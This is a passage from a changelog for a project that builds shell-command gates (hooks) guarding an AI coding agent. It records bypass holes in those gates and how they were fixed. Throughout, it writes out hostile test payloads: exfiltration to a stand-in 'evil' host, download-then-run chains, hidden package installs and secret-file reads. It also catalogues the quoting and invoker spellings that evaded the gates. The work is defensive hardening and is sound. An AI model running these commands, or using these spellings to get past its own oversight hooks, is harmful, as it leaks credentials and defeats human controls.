lines below**, so every install shipped two current costs for one shape; and
the >1200 s tree is `d20860b`, not `main`, which now IS the measured tree.
**Both figures are kept and MARKED, not refreshed away** — the 161.84 → 159.52
pair is a before/after whose point is the delta, and refreshing half of it
would destroy the record. No executable line, hook logic, gate body or dispatch
line moves; action counts unchanged (57 / 69 / 59, service 79 / agent 93).

**The policy citation moved with this entry, and again when the entry was
expanded after review: `795 → 851 → 882`.** This branch's first commit message
called it the "SIXTH move" and is immutable, so this is the correction:
derived from `git log` over `.claude/dynamic-workflow-policy.md`, the full
committed series is `207 → 367 → 423 → 601 → 637 → 755 → 781 → 790 → 795 →
851 → 882` — **eleven values, ten moves.** The checkpoint's "moved five times"
counted only the tail. It tracks a sentence, cite-by-line is fragile by
construction, and `test_doc_citations` caught every move here rather than a
reader finding a rotted citation later.

Harness and logs live at `.claude/checkpoints/x52-harnesses/headclass_v280.py`
and `logs-20260814/` — gitignored and durable, like the X-52 harnesses.

## Post-2.7.4, shipped in 2.8.0 — item 1 follow-up B5: the walk ran before the comment strip (2026-08-09)

**No version bump** (still item 1; freeze exception **50**). Not a fail-open —
an **unoverridable block that runs an operator-configured command first**, and
the most user-visible defect item 1 introduced.

`cmd_segments` seeds `_cs_subst_scan` (`lib/templates.py:1728`) **before** the
trailing-`#` strip in its emit loop, and `_scan_install_line` strips
(`seg.split(" #", 1)[0]`) **after** its lift. So a gated verb inside a
double-quoted substitution **in a comment** was lifted and matched. test-gate
then RUNS `commands.test` (timeout 600) and ci-mirror RUNS `commands.ci_local`
(timeout 900) before exiting 2, and **neither has an override path** the way
dependency-gate has `deps.md`. During ordinary red-test development a plain
`git status` carrying a trailing comment was refused, at the cost of a full CI
run. Measured, and attributed against merged main (allow there, deny here):

```
git status  # remember to run "$(git push origin main)" after   ci-mirror DENY
echo ok     # later: "$(git commit -m wip)"                     test-gate DENY
execprobe: rc=0 markers=[]        <- bash executes NOTHING in a comment
```

**The fix: the walk is now comment-aware**, rather than a strip bolted on in
front of it. An unquoted `#` that **begins a word** opens a comment. Two things
that a first cut gets wrong, both caught before shipping:

* **A comment ends at the NEWLINE, not at the end of the command.** Stopping the
  walk at the `#` passes every allow row and is a **fail-open**: in
  `git status # note` + newline + `echo "$(cat .env)"` the second line really
  executes (canary fired). The walk skips to the newline and **resumes**.
* **Word-start is carried as STATE, not read off the preceding character.** A
  word survives an escaped blank — `echo a\ #b` is the single word `a #b` — so
  `seg[i - 1]` reports a space and calls it a comment. `#` mid-word is literal
  (`echo a#b`), and `#` inside quotes is literal.

**The harness was blind here, and that is why this reached a green suite.**
`tests/test_substrate_differential.py` installed one tree with
`commands.test/lint/format/ci_local: "true"`; those gates deny only when the
configured command *fails*, so under `"true"` test-gate, format-lint-gate and
ci-mirror are **structurally unable to deny** and no row could speak about them.
The suite now installs a **second, armed tree** with those set to `"false"`, and
its B5 rows lead with positive controls — if a bare `git push` does not deny
there, the tree is not armed and the `allow` rows below it mean nothing.

**The first cut of this fix shipped two blockers, and the suite was green.**
The adversarial review found six defects; all are repaired here, and each one
is a different way for a relaxation to invent a comment bash does not have:

* **`)` was in the word-start set.** A `)` closing `$(...)`, `$((...))` or
  `<(...)` belongs to the CURRENT word, so `echo $(true)#"$(cat .env)"` really
  reads the secret — the walk called it a word start, declared a comment and
  dropped the rest of the line on BOTH substrates. `(`/`)` are out: every other
  member of the set terminates a word unconditionally, and the unquoted path has
  no expansion-nesting state to tell an operator `)` from a closing one.
* **The shell classified word-start with `[[:space:]]`**, which also matches CR,
  VT and FF. None is a bash blank, so `#` after one is mid-word and the
  substitution runs. The SDK's literal set did not match them: a shell-side
  fail-open and a substrate divergence at once — and ci-mirror is shell-only, so
  nothing backstops it there. Both substrates now spell one literal set.
* **A backslash-NEWLINE pair is a line continuation** — bash deletes it, so the
  word-start before it survives it. Clearing it lifted an install out of a
  comment (`make build \` + newline + `# later: "$(pip install …)"`), and since
  `norm_cmd` rescued the shell but not the SDK, the pair also diverged.
* **A line-leading `#` inside an UNQUOTED heredoc body is ordinary text** that
  bash still expands (canary fired). The `#` rule is now off for any command
  carrying a heredoc opener — `<<` after removing `<<<`, since a herestring has
  no body. See **X-42** for the one over-denial that textual test costs.
* **An unreachable `case` arm** was the one that visually mirrored the SDK's
  set, so a reader comparing substrates compared the wrong line — which is
  exactly how the `[[:space:]]` divergence stayed invisible. Deleted.
* **Cost.** Adding `#` to the walk's jump set cost +5.9 s on an 8 KB `#`-dense
  command, against dependency-gate's 60 s fail-closed ceiling where added cost
  IS over-denial. `#` now enters the jump set only where the comment arm can
  fire (unquoted, no heredoc): 6.54 s → 0.37 s against a pre-B5 0.37 s. **One
  shape is not recovered and is stated rather than hidden:** an unquoted
  MID-WORD `#`-dense 8 KB command is 3.27 s against a pre-B5 0.43 s, because
  such a `#` neither leaves the jump set nor ends the walk. It is bounded by
  `_SUBST_MAXLEN` (~3.3 s total, not a curve) and 18x under the ceiling;
  recovering it belongs to the queued exhaustion work, which re-measures this
  walk anyway. The first write-up of this bullet quoted only the quoted-`#`
  number and so overstated what the change achieves.

**A second review round, on the repairs themselves, found two more blockers**
— which is why it was run at all, the first cut having been green and wrong:

* **A blank inside `${...}` is not a word boundary.** `echo ${FOO:-a #b} END`
  prints `a #b END`, so the `#` is data; the walk read the space before it as a
  word start and dropped the line. `echo ${x:- #} "$(pip install evil)"` was
  allow/allow with pip really running. The walk now carries `${...}` depth —
  *carries*, not skips, because a substitution nested inside one is live and
  must still be lifted (`${x:-"$(cat .env)"}`, canary fired).
* **CR, VT and FF never reach any gate as themselves.** `_join_cont`, the
  sanctioned reader, maps all three to a SPACE before gate code runs, and after
  that nothing can tell a synthesised blank from a typed one. That was inert
  until B5 added a rule that RELAXES on a blank. It also means the previous
  round's repair — spelling the word-start set without those characters — was a
  no-op on the shell for exactly the bytes it named; the review caught that the
  three corpus rows pinning it were all on secrets-gate, the one gate whose
  `_sg_pass` walks the command it was handed, so they could not fail. `_join_cont`
  now flags the substitution and the walk switches its `#` rule off for that
  command. The SDK half survives for the three VERB gates, which read a
  normalised spelling: **ledgered as X-43**, shell-deny / SDK-allow, the
  direction this module tolerates.

A repair from the first round was also **reverted**: passing the raw command to
the walk and to six `git_verb` call sites was measured to change nothing once
the `_join_cont` flag existed — identical on the corpus and on every targeted
battery — so it was surface across six gates for no effect.

**Measured.** 34 rows. Every fence was proved load-bearing by building the wrong
fix and watching it fail — stopping at the `#` breaks 5 rows, reading
`seg[i - 1]` breaks 1, ignoring word-start breaks 2, the naive quote-blind
pre-strip (the other fix direction) breaks 7, and restoring each of the six
repairs above breaks 1–3 each, and so does each round-2 repair. Two changes
that did NOT discriminate were handled as such rather than kept on faith: one
row is labelled a CONTROL, and the raw-command repair was reverted. One row is labelled a CONTROL rather than a
fence because it was measured to pass either way: its deny is over-determined by
the comment line's plain text, so no payload of that shape can isolate the walk.
Gate verdict and `execprobe` ground truth agree on every row.

The **heredoc** half of the same root cause is ledgered as **X-42**: the
quoted-heredoc over-denial is real, but a bare verb in a quoted heredoc denies
on merged main too, so closing the walker's half alone buys nothing — while an
`<<EOF` (unquoted, and it really does expand) mistake would reopen a proven read.

## Post-2.7.4, shipped in 2.8.0 — item 1 follow-up B2: the D20 download-then-run driver (2026-08-09)

**No version bump** (still item 1; freeze exception **50**, round-3 addition).
`_download_then_run` was the **one** whole-command segmentation driver in
`lib/sdk_gates_template.py` that item 1 did not convert, while its shell twin
walks `cmd_segments "$_D20CMD"` (`lib/templates.py:4160` write pass, `:4421` run
pass) and therefore *did* gain the substitution seed. So the shell's D20
correlation learned to see inside a `$(…)` and the SDK's stayed blind:
`echo "$(curl -o x.sh URL)" ; bash x.sh` was **shell-deny / SDK-ALLOW**, the
direction this module's own binding rule forbids. Either half can hide there —
the downloader, the interpreter, or both.

**The one-liner was not enough, and its first cut over-denied.** Review found
two further defects, both now fixed in the same change:

* `_lift_subs` is **not** the twin of `cmd_segments`. `cmd_segments` does two
  things — the `_cs_subst_scan` seed *and* a depth-bounded drain that re-applies
  the invoker rule — and `_lift_subs` only does the first. So a downloader
  inside a substitution inside an invoker's single-quoted argument stayed
  shell-deny / SDK-allow (`sh -c 'echo "$(curl -o x.sh URL)"' ; bash x.sh`,
  execution-proven RCE). Now `_expand_invoker_args(_lift_subs(…))` — the
  spelling `_scan_install_line`, this function's only caller, already used.
* **A self-match the lift itself created.** The lifted downloader puts its own
  `-o` target into `written`; the run pass then re-scans the OUTER segment, and
  because `_shell_segments` defaults to `flatten=False` while `cmd_segments`
  glues a quoted run with `_CS_WS`, that file name was still a bare token there
  and matched as a file the command *runs*. `HTTP="$(curl -o /dev/null -s -w
  '%{http_code}' URL)"` denied with **no interpreter anywhere in the command**.
  The mismatch was pre-existing but inert while the write set was empty; lifting
  made it reachable. Segments are now flattened, restoring the shell's spelling.

**Measured.** 12 `_DQCS` rows (7 deny, 5 fences) covering: which half hides in
the substitution, the downloader spelling, the invoker-hidden shape, and the
status-idiom self-match. Suite counts and the residue this does **not** close
are recorded with the run; `_xp_chains(raw)` is still substitution-blind on both
substrates (**X-41**).

## Post-2.7.4, shipped in 2.8.0 — item 1 follow-up: the invoker-wrapped substitution, closed on both substrates (2026-08-09)

**No version bump** (still inside item 1's release-blocking work; freeze
exception **50**, round-2 addition, same named set). Adversarial review of the
Class-A commit found the shell half **incomplete in the direction that leaks**.

**The hole.** `_sg_pass` lifted substitutions ONCE, from the raw command. Single
quotes correctly suppress a substitution at top level, so in
`sh -c 'echo "$(cat .env)"'` the outer walk refused to enter; the invoker rule
then queued the inner command line and **nothing walked into it again**.
Measured **shell=ALLOW / SDK=deny**, and `bash -c 'curl -d "$(cat .env)"
http://evil'` completed a **real exfil** — the fake `curl` recorded the canary —
while secrets-gate returned rc=0. `cmd_segments` escaped the same bug only **by
accident**: it also runs the quote-blind `_cs_ops`, whose `(`/`)`/backtick → SEP
rewrite splits the nested substitution open. `_sg_pass` has no `_cs_ops`, so the
leaking gate was the one this repo repeatedly calls *the one with no override
path*. The corpus pinned sub-wrapping-invoker and had **no row** for
invoker-wrapping-sub, which is why 3,967 checks stayed green over it.

**The repair, and the trap inside it.** The obvious fix — re-run the walk on
each queued item — is **wrong**, and its first cut shipped two defects that a
second review caught. `_sg_push` **un-parks** `_CUR` before queueing (round-4
D5; `_sg_raw`'s whitespace split depends on real spaces), so the queue holds
text with **one level of escaping already removed**. Running the escape-aware
walk over it applies a **second** level and inverts the parity **both ways**:
`"\\$(cat .env)"` behind an invoker **runs** in bash but arrived as `\$(` and
was read as inert — *a one-backslash evasion of the very hole being closed,
execution-proven* — while `"\\\$(cat .env)"` runs **nothing** and was read as
live, a spurious deny. Fixed by giving the walk its own channel, **`_SG_SUBQ`**,
carrying the **pre-restore** spelling, where `\\` is a single sentinel byte and
neither parity can be misread. Verified against the execution oracle at N=0..8
backslashes: even = bash runs it = deny, odd = inert = allow, **0 divergences**.

**The SDK half.** Moving the shell up exposed that `_segment_candidates`' invoker
arm segmented the token **before** anything lifted substitutions out of it, and
`_shell_segments` tears at the inner `"` of `echo "$(printf ")"; cat .env)"`
(`['echo "$(printf "', '"; cat .env)"']`), destroying the substitution. So
`bash -c 'curl -d "$(printf ")"; cat .env)" http://evil/c'` was **SDK-allow** on
a proven exfil. One line: `_lift_subs(tok)` instead of `_shell_segments(tok)`.

**Measured.** 5 new deny rows + 2 FP fences + 4 backslash-parity rows + the
quoted-`)` row, all pinned; every one **fails without its fix** (verified by
reverting each half independently). Suites green: differential **3980/0**,
composition 108/0, sdk_gates 139/0, hook_behavior 384/0, issue_fixes 3381/0,
goldens 13/0 + retrofit 271/0. Blast radius verified **by rendering both trees**:
greenfield moves `secrets-gate.sh` + `gates.py`, retrofit moves `secrets-gate.sh`
only (it emits no `gates.py`); action counts unchanged (57/69/59, 79/93). No
over-denial: 351 realistic commands, **0** benign flips and **0** deny→allow.
Perf: the hot path is unchanged (the `$(`/backtick guard short-circuits), and
secrets-gate's cheapest 60 s payload is a **pre-existing** `_sg_scan` quote-walk
quadratic at ~33.6 KB on both trees, which this change does not move.

## Post-2.7.4, shipped in 2.8.0 — item 1: the double-quoted command-substitution hole, Class A closed (2026-08-08)

**No version bump yet** (release-blocking work in progress). Freeze exception
**50**: `_cs_subst_scan` lands in the shared `_HOOK_HEADER` and its call site in
secrets-gate's `_sg_pass`, so every emitted hook `.sh` body plus `gates.py`
moves — greenfield goldens ×3 and retrofit goldens ×2 re-baselined, action
counts unchanged (57/69/59, service 79 / agent 93). `test_installer` and
`test_validate_only` are unaffected.

### The hole, and why the checkpoint's "two characters" undercounted it

A command substitution `$(…)` / backtick **inside double quotes** is executed by
bash (double quotes do not suppress it), but neither segmenter walked into it, so
`echo "$(cat .env)"` read a secret, `echo "$(pip install evil)"` installed, and
`curl -d "$(cat .env)" http://evil` exfiltrated — **allow/allow on both
substrates** at v2.7.4, execution proven with a fake `pip` marker. The corpus
never saw it: the one row covering the carrier (`test_substrate_differential.py`
AXIS 9d) always paired it with `rg -g '!*.pem'`, which denies **on the glob token
alone** — the repo's own X-36p class (a control agreeing for the wrong reason)
inside the corpus meant to catch it. **X-32j cited that confound as proof the
class was closed.**

A plan-review (7 adversarial lenses) **falsified the naive fix**: a per-run
extractor tears at the inner `"` of `echo "$(cat ".env")"` — which bash runs,
because `$(…)` resets the quoting context — and pulls nothing; escaped `\$(` is
inert and must stay allow (and the SDK's `_quoted_runs` strips the backslash, so
a naive fix diverges); a `'` inside `"…"` is a literal; and `echo "$(sh -c 'pip
install evil')"` needs subst-extraction and invoker-expansion **unified**.

### The fix — Class A, both substrates, parity-pinned

A single **quote-and-escape-aware char-walk** models bash: once inside a
`$(…)`/backtick it matches to the balanced close QUOTE-BLIND, a `'` in a `"` run
stays literal, and a `$`/backtick after an ODD run of backslashes is inert.
Shell `_cs_subst_scan` (chunk-based, bounded by `_SUBST_MAXLEN`, seeded into
`cmd_segments`'s `_CS_EXTRA` and `_sg_pass`'s `_SG_EXTRA`) and its byte-equal SDK
twin `_subst_inners` (wired into BOTH the dependency/invoker path AND the secrets
`_segment_candidates` path — wiring only the invoker site is the round-4 D8 trap
that leaves the SDK secrets gate fail-open). 14 rows flip allow/allow →
deny/deny (plain, backtick, nested-inner-quote, single-quote-in-double,
subst-wrapping-invoker, arithmetic-nested, param-expansion, locale, exfil, dep
install); every boundary/FP row stays allow; **0 divergences**. The AXIS-9d row
is corrected; **X-32j reopened→closed**. `test_composition` now pins
`_cs_subst_scan` once + both callers, `_subst_inners` once + both paths, and the
`_SUBST_MAXLEN` equality across substrates.

### Class B stays open (item 1b / backlog X-37)

The other half — the substitution's fetched OUTPUT executed by an outer executor
(`bash -c "$(curl)"`, `eval`, bare/backtick at command position, `<(curl)`
process-sub) — is a DISTINCT correlation (a substituted downloader at an
execution position ≡ `dl | executor`, modelled beside `pipe_to_shell_regex`, not
inside the fileless D20 correlation). Pre-existing allow/allow, **ledgered
`allow`** in the differential corpus so it is legible, needs its own review.
**Item 1 remains release-blocking until 1b lands.**

## Post-2.7.4, shipped in 2.8.0 — G-6 closed, and the two unpinned emission paths pinned (2026-08-08)

**No version bump.** No configuration key exists that did not, and the one
emitted body that moves does so by one comment line. Recorded here *before*
release rather than at release time: PR #58 went unrecorded for exactly the
opposite habit.

Freeze exception **49**. Suite 24 → **25 suites**, 9416 → **9462 checks**.

### G-6 is closed, and it was two gaps plus a third it never named

The **version half** was fixed at v2.7.4 and is pinned. The **filename half** is
answered by a convention that already existed and that G-6 was written without
noticing — the PRD's own filename note says the filename tracks *doc folds*, not
code releases. It now carries the decidable trigger it lacked, so a delta can
state what it amends: **the pair whose `**Version:**` equals `PROTOCOL_VERSION`**,
exactly one at any time, asserted by `tests/test_installer.py`. README now says
the same; it was the only genuinely missing statement of the three.

**Renaming was considered in two shapes and declined in both** — to `v2-7-4`
(contradicts the shipped fold convention, and must then recur every release) and
to a stable unversioned name (same objection, and it invalidates the *path* of
every historical citation, not just its line). Both also move an emitted body,
because the PRD filename ships inside `.claude/hooks/iteration-summary-enforcement.sh`.

### The third gap: line citations rot silently, and one of them ships

Citations into the PRD are **unversioned, not wrong** — each was correct when
written and invalidated by the next edit. One target moved
**654 → 670 → 713 → 739 → 759** across five releases. Five reviews passed over it.

`tests/test_doc_citations.py` closes the class. It stores an **anchor, never a
line**, asserts the anchor is **unique** in the cited document, derives the line,
and asserts the citing file states it. Uniqueness is the load-bearing part: a
plain substring check produces *false passes* whenever the anchor repeats, and
`Iteration-summary enforcement` occurs twice in the PRD.

Its completeness scan immediately found **six citations nobody knew about**,
including two into the Companion, and then flagged **freeze exception 49's own
note** minutes after it was written. Historical records (`docs/changelog.md`,
closed backlog rows, the dated lens-findings docs) are excluded by name —
renumbering them to today's lines would corrupt a dated record.

### The two unpinned emission paths

`.claude/steering/telemetry.md` and the retrofit plans both carried
`PROTOCOL_VERSION` and moved at every release, pinned by nothing.

- **telemetry.md** — pinned by a targeted body digest, not a fourth aggregate
  fixture: ~60 actions to observe one new body would enlarge every future
  re-baseline for no added coverage.
- **retrofit** — pinned with a **kind-inclusive** digest. This file's existing
  `plan_digest` hashes path+body+mode and omits `kind`, and retrofit is the one
  mode that *mutates* `kind` (the agent fixture emits `gitignore_root`), so a
  kind-blind golden would have been blind to the exact regression class.

**Freeze exception 48's note was wrong in both halves and is corrected in
place.** "Moved stamp-only" was false for retrofit: measured across v2.7.3 →
v2.7.4, the service fixture moved **twelve** bodies, of which one was the stamp
and eleven were PR #57's hook bodies — pinned for greenfield by exception 47, and
for retrofit by nothing.

**Cost, in the honest unit:** the pinned set is larger, so *every* emitted-surface
change re-baselines more digests — not just version bumps. Those bytes were
already moving; they were simply unobserved.

## 2.7.3 → 2.7.4 — a head form neither walker saw past, and a policy for the tool that found it (2026-08-07)

**PATCH**, on the criterion this file states: no configuration key exists that
did not — PR #57's fix is one shared list (`cmdpos.KEYWORDS` + `GROUP_TOKENS` +
`NAMED_GROUP_HEADS`), all internal constants — and the emitted gates only got
**stricter**: **0 verdicts moved deny → allow** across 31,880 probes, with 112
rows moving allow → deny. `PROTOCOL_VERSION` in `lib/installer.py` and
`lib/templates.py`, `plugin/plugin.json`'s version and description prose, the
version assertions **and their check labels** in four suites, the README pin
target and applicability range, and the PRD's `**Version:**` header.

Contains PRs **#57**, **#58** and **#59**. Suite 9276 → **9416 checks**, 0
failed; 23 → **24 suites**. Freeze-exceptions **47** (PR #57) and **48** (the
version stamp).

### PR #57 — a head form neither walker saw past (X-36v / X-36w)

`{ bash -c "pip install evil"; }` was allow/allow on **both** substrates while
the subshell twin `( bash -c "pip install evil" )` denied — because `(` is a
segment break and `{` is not. **Twelve live spellings, not two:** `{`, `}`, `!`,
`if`, `then`, `elif`, `else`, `do`, `while`, `until`, `function`, `coproc`,
plus the escape-prefixed head on the shell. (`select` is **not** among them and
is not in the fix's lists: `lib/cmdpos.py:176-179` records it as verified to
DENY already, because its body is reached through `do`, which is in the set.
The count of twelve is right; an earlier draft of this entry swapped `}` for
`select`, inheriting the error rather than rebuilding the list.)

Two review lessons are recorded with it, both of which changed the fix:

- **"Bounded" was a property of the fragment, not the class.** The keyword half
  was filed bounded because `then bash -c '…'` is a syntax error. Inside
  `if true; then bash -c '…'; fi` the walkers get a segment that still starts
  with `then`, and bash runs it.
- **`while` / `until` / `coproc` / `select` were recorded bounded from a probe
  that measured the harness, not the payload** — `while false` never entered
  its body, `coproc` is asynchronous and the parent exited first, and `select`
  read EOF. All four run. Measure execution with a file marker, never captured
  stdout.

One list read by four consumers (`prefix_run`, `_invoker_at`, and both shell
walkers through a new shared `_cs_head_kind`), mutation-tested six ways.

### PRs #58 and #59 — dynamic workflows: assessed, then bounded

**Maintainer-side only. Nothing emitted, no seam event, no pin moves.** PR #58
was not recorded in this file at the time; it is recorded here with #59, which
completes it.

- **#58 — `docs/dynamic-workflow-assessment.md`.** Verdict on Claude Code's
  `Workflow` tool: **adopt-narrowed, development tooling only, never emitted.**
  The blocking finding is measured: one Bash call fires *five* `PreToolUse`
  hooks, and at N=16 concurrent agents ordinary commands flip verdict —
  `git add` at 5,000–7,000 paths is **allowed solo and refused at N=16**, same
  command, same config, same install. A gate verdict that depends on ambient
  fleet size is indistinguishable from a flaky gate.
- **#59 — `.claude/dynamic-workflow-policy.md` + `tests/test_dynamic_workflow_policy.py`.**
  The policy decides HOW where the assessment decided IF and WHERE: four
  permitted uses behind a two-limb admission test, six prohibitions, six
  operating rules, two accounting rules, and one named open question
  (**DW-G1**, how a fan-out interacts with the trust ramp — owner's to close).
  It carries **B-4**, which the
  assessment classifies as blocking *maintainer* use — the pollution detector
  is a whole-repo before/after diff, sound only under a single serialised
  writer — so test execution is serial by any entry point and there is one
  writer to the repository including the index and refs.

  The suite is a tripwire the golden digests cannot be: re-baselining a digest
  is routine (see exceptions 30, 31, 33, 34, 35, 40 and 48 below), so emitted
  orchestration would land green through the goldens. It plants a violation for
  every signal and asserts each fires before asserting the tree is clean.

  **DW-G1 is left open on purpose.** How a fan-out interacts with the trust
  ramp is an owner decision; the interim posture is that fan-out is
  ramp-neutral — it neither unlocks nor requires anything, and width is not a
  substitute for a rung.

### The PRD header, and what this release does *not* do

`Bootstrap-Protocol-v2-8-0.md`'s `**Version:**` field read **2.7.0** through
three releases (2.7.1, 2.7.2, 2.7.3). Those were gate corrections adding no
operator-facing surface a PRD would describe, so the body needed no edit — but
the version field should have tracked `PROTOCOL_VERSION` regardless. Now 2.7.4.
This is the partial close of assessment gap **G-6**; the filename-vs-version
skew that gap also names is unchanged and still open.

**No PRD section describes a fan-out feature, and none should.** The verdict is
*never emitted*, so the protocol has no such concept. The PRD changes are exactly
two: the `**Version:**` header (with its v2.7.4 release block, in the form every
prior release used), and one paragraph extending the existing "Not protocol
surface, deliberately excluded" block to name `.claude/dynamic-workflow-policy.md`
beside `.claude/trust-ramp.md`. No other section moves.
Assessment §12's list of PRD sections a delta *would* touch remains unspent —
it is explicitly conditioned on a delta touching emitted surface.

## 2.7.2 → 2.7.3 — the fourth and fifth consumers, and a control that kept agreeing for the wrong reason (2026-08-06)

**PATCH**, on the criterion this file states: no configuration key exists that
did not (`INVOKER_WORD_MAX` is an internal constant, not operator-facing
surface), and the emitted gates only got **stricter** — **0 verdicts moved
deny → allow**, measured across ~426,000 verdict evaluations in the review pass
and re-confirmed on a 70-row independent differential. `PROTOCOL_VERSION` in
`lib/installer.py` and `lib/templates.py`, `plugin/plugin.json`'s version and
description prose, the version assertions **and their check labels** in four
suites, and the README pin target.

Contains PR **#55** (issue **#54**). Suite 8373 → **9276 checks**, 0 failed.
Freeze-exceptions **45** and **46**.

### Issue #54 — a versioned shell invoker bypassed the gates

`bash5.2 -c "pip install evil"` walked past the approved list on **both**
substrates while `bash -c` denied. **40 of 40 versioned spellings leaked; all
10 unversioned twins denied.** `ksh93` is the real AT&T ksh binary name;
`bash5`/`zsh5` are real distro binaries.

**It was three times wider than filed, and both corrections came from the same
failure mode.** `secrets-gate` leaked — `bash5.2 -c "cat a.pem extra"` was
allow/allow and reads a **private key**. `test-gate` and `ci-mirror` leaked —
`bash5.2 -c "git commit -m x"` and `-c "git push"` are rc=0 where the twin is
rc=2, i.e. commit without tests and push without CI.

Cause: a **fourth and fifth consumer** of one reduction. `interpreter_word()`,
the install anchor and the D20 run walk read `cmdpos.INTERP_SUFFIX`;
`_invoker_at`, `_cs_isinv` and secrets-gate's own `_sg_push` tested **exact
membership**. `_int_word`'s docstring said *"three of at least five"* for
exactly this row.

**The SDK reads FOUR token spellings and ORs them.** There are three shell
readings of one token — `_cs_isinv` drops quotes and keeps escapes, `_sg_push`
keeps quotes and strips escapes, raw text does neither — and `_invoker_at` feeds
both walks. No single spelling can match both, and **any spelling a shell walker
sees that the SDK does not is an SDK-more-permissive split**, the one direction
the contract forbids. Not a new convention: `_segment_candidates`' unbalanced-
quote fallback already emits exactly these twins. Measured on an 11,508-row
hostile-head corpus — raw token 1,926 new forbidden rows, quote-stripped 721,
the union **440** while closing **580** pre-existing.

**Every arm, not some.** The prefix and assignment arms were left reading the
raw token in the first cut: 5,520 new forbidden rows, and unlike the other
residues **bash executes those**. Repairing that introduced a **deny → allow of
its own** — basenaming an assignment value hid it from the assignment and flag
arms — caught only by a pin added in the same change. The invariant is now
written down: *every arm must read a superset of what it read before.*

`INVOKER_WORD_MAX = 255` is POSIX `NAME_MAX`, a **semantic** bound rather than a
perf fence: a length fence inside a security fix is a fail-open guard, but a
basename longer than `NAME_MAX` cannot name a file on any POSIX filesystem. It
removes the single-long-word ceiling band (120 KB: 101 s unbounded → 58 s,
matching base). A **second band remains** at ~70 KB driven by the *number* of
invoker tokens, inherited convergence — v2.7.2 already blew the ceiling for
`bash bash bash …` at 123 s — disclosed as **X-36y** rather than fenced.

### The methodological lesson, because it is now three-for-three

**A control can agree for the wrong reason**, and checking for it was the single
most productive review move of this release:

1. `--default-index <url>` (v2.7.2) looked like parity because the URL fell
   through to the package check; a **local** value exposed the split.
2. `bash5.2 -c "cat .env"` looked like `secrets-gate` immunity because `.env*`
   is a **substring** match that fires on raw text with no invoker walk involved
   — `echo "cat .env"` denies identically. `*.pem`/`*.key` are **end-anchored**,
   so one trailing token isolated the walk and exposed the key read.
3. *"11 of 13 hooks change bytes only"* was measured on a config with
   `commands.test: "true"` and no git repo — in which four of those hooks
   **deny nothing for any input**. A hook that denies nothing at base cannot
   demonstrate byte-only-ness. Six hooks actually move.

**How to apply: when a control PASSES, construct a payload whose verdict can
only come from the arm you claim to be exercising; for a gate, first prove the
gate can deny at all in the configuration you measured it in.**

Related: **reviewing the plan** blocked this fix twice before a line was
written, and the code review blocked the implementation once — four independent
blocks, each catching something the previous stage stated as measured fact,
including a judge's "decisive table" that re-measured at 721 forbidden-direction
rows where it claimed 0.

### Backlog

New rows **X-36u/v/w/x/y/z**, each recording its measured count and — the
distinction that matters — **whether real bash executes it**. Two are live and
are the next work: `{ bash -c "pip install evil"; }` (X-36v, brace group,
allow/allow on both substrates, bash runs it, while the subshell twin
`( … )` denies) and `\sh -c "pip install evil"` (X-36w, shell-allow, bash runs
it). X-36u and X-36x are bounded by `unexpected EOF` — bash refuses to parse and
nothing runs; X-36y is fail-closed; X-36z is an inherited `eval-gate` finding.


## 2.7.1 → 2.7.2 — three consumers of one reduction, and a decidability rule (2026-08-05)

**PATCH**, on the criterion this file states: no configuration key exists that
did not, and the emitted gates only got **stricter** — measured, not asserted.
Across both merged PRs, **0 verdicts moved deny → allow** on either substrate
(#49: a 27-row differential plus an exhaustive escape sweep; #52: ~190,600 SDK
and ~142,700 shell rows over five corpora). `PROTOCOL_VERSION` in
`lib/installer.py` and `lib/templates.py`, `plugin/plugin.json`'s version and
its description prose, the version assertions in four suites, and the README's
consumer pin target — which had been **stale at `v2.6.0` for three releases**
and is now part of the release checklist.

Contains PRs **#49** and **#52** (#52 supersedes #51 — see the GitHub-mechanics
note below). Suite 7487 → **8373 checks**, 0 failed. Freeze-exceptions **42**
(four amendments) and **43**.

### Issue #50 — a versioned interpreter defeated the download-then-run walk

`curl -o a.sh <url> ; python3.12 a.sh` executed the fetched bytes on **both**
substrates while bare `python3` denied. The D20 launder-then-run walk tested
interpreter membership **exactly** and never applied `INTERP_SUFFIX`. It was
never a python-only class: `perl5.36`, `ruby3.2`, `node20`, `php8.2`, `bash5`,
path-qualified, quoted and escaped forms — 16 spellings — all ran. The **pipe**
trigger caught every one, because `interpreter_word()` applies the suffix over
all of `INTERPRETERS`.

This is the D3 shape issue #40 fixed twice, **on a third consumer nobody joined
to the set**. #40's own note said "fix both spellings from one set"; *both* was
the count of consumers known at the time. There were three. There are at least
five — `_invoker_at` and its shell twin are a fourth and are recorded as X-36q,
unfixed.

**Where the reduction is read is the entire design, and the obvious site is
wrong twice.** Reading it at the `_FILE_RUNNERS` arm — the first test in phase 1
— resolves a command word out of an **assignment value, an attached flag value
or a wrapper operand**, so `curl -o b.sh U ; A=/x/python3.12 sh -c "$(cat b.sh)"`
goes deny → **ALLOW**: a one-token, attacker-chosen disarm prependable to any
laundered payload. That arm also `break`s before `hit()` and the opaque
path-form test, so both must return as guards — and the guards then fire on
every *exact* member too, refusing **83 of 112** realistic fetch-then-use
commands, which is precisely the shape **X-36h was reverted for**.

The shipped fix reads the reduction in the **ordinary-word branch**, as a
*tentative* command word applied only after the phase-2 forward scan finds
nothing. Both failures die **by construction**: that branch is reached only
after the assignment, prefix, compound-head and flag arms decline, and the two
guards are the statements immediately above it. The `_FILE_RUNNERS` arms are
left byte-identical on both substrates. `lib/cmdpos.py` is byte-identical too —
`INTERP_SUFFIX` is **not** widened, so X-36i stays blocked behind X-36a.

**The claim is CONVERGENCE, not "deny-only".** A versioned spelling now receives
exactly the verdict its unversioned twin already received, and is never more
permissive. What that costs, recorded because "0 newly refused" would mislead:
**126 of 420** versioned fetch-then-use rows newly refuse (all behind a stage
whose write cannot be named; **126 of 126** unversioned twins already denied);
**792 new SDK-more-permissive splits** appear on space-quoted write targets,
where the **SDK is the side that is right** (`my a.sh` is not `a.sh`) and the
shell has over-keyed since v2.7.1; and a ~4%-wide band near 100 KB of
single-token command word crosses the 60 s fail-closed ceiling.

### X-36h Part 1 — decidability, not "does this word carry `$`"

`$'\x70ip' install evil` and `pi${x:-p} install evil` bypassed the approved
list. Two prior attempts were reverted, both keyed on the wrong signal: a word
carrying `$` is *also* `$KUBECTL`, and narrowing by a trailing `INSTALL_VERBS`
word refused 15 of 46 ordinary commands.

The discriminator is **decidability — is the word's value visible in the command
TEXT?** ANSI-C numeric escapes and a literal `${x:-default}` branch are; bare
`$KUBECTL`/`$HELM`/`$BUILD` yield **no candidate at all**, which is what makes
the over-refusal structurally impossible rather than merely unobserved. They
